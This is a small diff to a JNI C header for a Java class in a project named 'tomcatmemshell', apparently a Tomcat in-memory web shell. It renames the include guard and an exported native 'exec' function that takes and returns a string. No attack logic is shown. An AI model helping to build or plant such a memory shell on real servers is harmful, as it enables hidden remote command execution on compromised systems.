@@ -2,8 +2,8 @@
 #include <jni.h>
 /* Header for class org_example_tomcatmemshell_JNI_JNIMemShell */
 
-#ifndef _Included_org_example_tomcatmemshell_JNI_JNIMemShell
-#define _Included_org_example_tomcatmemshell_JNI_JNIMemShell
+#ifndef _Included_org_example_tomcatmemshell_JNI_JNIMemShell_00024howToLoader
+#define _Included_org_example_tomcatmemshell_JNI_JNIMemShell_00024howToLoader
 #ifdef __cplusplus
 extern "C" {
 #endif
@@ -12,7 +12,7 @@ extern "C" {
  * Method:    exec
  * Signature: (Ljava/lang/String;)Ljava/lang/String;
  */
-JNIEXPORT jstring JNICALL Java_org_example_tomcatmemshell_JNI_JNIMemShell_exec
+JNIEXPORT jstring JNICALL Java_org_example_tomcatmemshell_JNI_JNIMemShell_00024howToLoader_exec
   (JNIEnv *, jclass, jstring);
 
 #ifdef __cplusplus
